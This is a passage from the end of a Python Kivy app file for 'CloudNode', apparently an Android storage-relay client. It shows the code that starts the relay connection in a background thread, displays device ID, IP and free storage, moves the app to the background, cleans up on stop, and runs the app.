            on_file_received=_on_file_received,
            on_status_change=_on_status_change,
        )

        def _connect():
            ok = self.relay.start()
            if ok:
                log.info("Service started successfully")
                start_foreground_service()
            else:
                def show_error(dt):
                    self.status_label.text = "Connection failed - check internet"
                    self.status_label.color = (0.85, 0.3, 0.3, 1)
                Clock.schedule_once(show_error)

        threading.Thread(target=_connect, daemon=True).start()

    def _update_info(self, *args):
        """Update the info display."""
        if not self.relay or not self.relay.is_connected():
            return
        free, total = get_storage_info(self.storage_root)
        self.info_label.text = (
            f"ID: {self.device_id}\n"
            f"IP: {get_local_ip()}\n"
            f"Free: {humanize_size(free)} / {humanize_size(total)}\n"
            f"Storage: {self.storage_root}"
        )

    def _hide_app(self, *args):
        """Move the app to the background."""
        try:
            from jnius import autoclass
            PythonActivity = autoclass("org.kivy.android.PythonActivity")
            activity = PythonActivity.mActivity
            activity.moveTaskToBack(True)
        except ImportError:
            try:
                Window.minimize()
            except Exception:
                pass
        except Exception:
            pass

    def on_stop(self):
        """Clean up when app closes."""
        if self.relay:
            self.relay.stop()


# ============================================================================
# ENTRY POINT
# ============================================================================

def main():
    """Run the CloudNode app."""
    CloudNodeApp().run()


if __name__ == "__main__":
    main()
